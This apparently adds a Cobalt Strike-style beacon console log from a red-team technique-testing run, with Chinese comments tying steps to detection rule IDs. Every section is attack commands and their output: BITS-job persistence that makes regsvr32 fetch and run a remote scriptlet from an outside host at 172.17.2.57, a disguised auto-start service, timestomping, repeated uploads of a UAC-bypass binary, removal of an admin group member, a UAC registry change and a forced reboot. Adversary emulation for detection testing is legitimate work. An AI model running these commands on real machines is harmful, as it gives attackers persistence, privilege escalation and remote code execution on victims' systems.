@@ -1,0 +1,151 @@
+02/26 10:02:11 [task] Tasked beacon to run: bitsadmin /create backdoor
+02/26 10:02:11 [task] Tasked beacon to run: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
+02/26 10:02:11 [task] Tasked beacon to run: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:http://172.17.2.57:8080/back.sct scrobj.dll"
+02/26 10:02:11 [task] Tasked beacon to run: bitsadmin /Resume backdoor
+02/26 10:02:11 [task] Tasked beacon to run: bitsadmin /complete addfile
+02/26 10:02:55 [checkin] host called home, sent: 395 bytes
+02/26 10:02:57 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Created job {431B5F0C-2515-473C-8D1A-D5FEE36E95BC}.
+
+
+02/26 10:02:57 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Added C:\Windows\System32\cmd.exe -> C:\Users\a\AppData\Local\Temp\cmd.exe to job.
+
+
+02/26 10:02:57 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+notification command line set to 'regsvr32.exe' '/u /s /i:http://172.17.2.57:8080/back.sct scrobj.dll'.
+
+
+02/26 10:02:57 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Job resumed.
+
+
+02/26 10:02:57 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Unable to find job named "addfile".
+
+
+02/26 10:17:41 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/26 10:17:41 [task] cd c:\windows\system32
+02/26 10:17:41 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 10:17:41 [task] cd c:\RedTeam\
+02/26 10:17:41 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
+02/26 10:17:41 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
+02/26 10:17:41 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
+02/26 10:17:41 [task] Tasked beacon to run: sc delete netsrv
+02/26 10:17:41 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/26 10:17:41 [task] Tasked beacon to run: sc start netsrv
+02/26 10:17:57 [checkin] host called home, sent: 9590 bytes
+02/26 10:17:59 [error] could not upload file: 32
+02/26 10:17:59 [error] could not set file time: 6
+02/26 10:17:59 [output]
+received output:
+[SC] OpenService 失败 1060:
+
+指定的服务未安装。
+
+
+
+02/26 10:17:59 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/26 10:17:59 [output]
+received output:
+
+SERVICE_NAME: netsrv 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 61976
+        FLAGS              : 
+
+
+02/26 10:44:15 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
+02/26 10:44:15 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 10:44:15 [task] cd c:\RedTeam\
+02/26 10:44:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+02/26 10:44:15 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+02/26 10:44:15 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
+02/26 10:44:59 [checkin] host called home, sent: 160369 bytes
+02/26 10:51:00 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
+02/26 10:51:00 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 10:51:00 [task] cd c:\RedTeam\
+02/26 10:51:00 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+02/26 10:51:00 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+02/26 10:51:00 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
+02/26 10:51:59 [checkin] host called home, sent: 160369 bytes
+02/26 10:52:33 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
+02/26 10:52:33 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 10:52:33 [task] cd c:\RedTeam\
+02/26 10:52:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+02/26 10:52:33 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+02/26 10:52:33 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 calc.exe
+02/26 10:52:59 [checkin] host called home, sent: 160366 bytes
+02/26 10:59:46 [task] 4*******降低权限*******
+02/26 10:59:46 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
+02/26 11:00:00 [checkin] host called home, sent: 171 bytes
+02/26 11:00:05 [output]
+received output:
+命令成功完成。
+
+
+
+02/26 11:04:33 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+02/26 11:04:33 [task] Tasked beacon to run: shutdown /r /f
+02/26 11:05:05 [checkin] host called home, sent: 233 bytes
+02/26 11:05:06 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
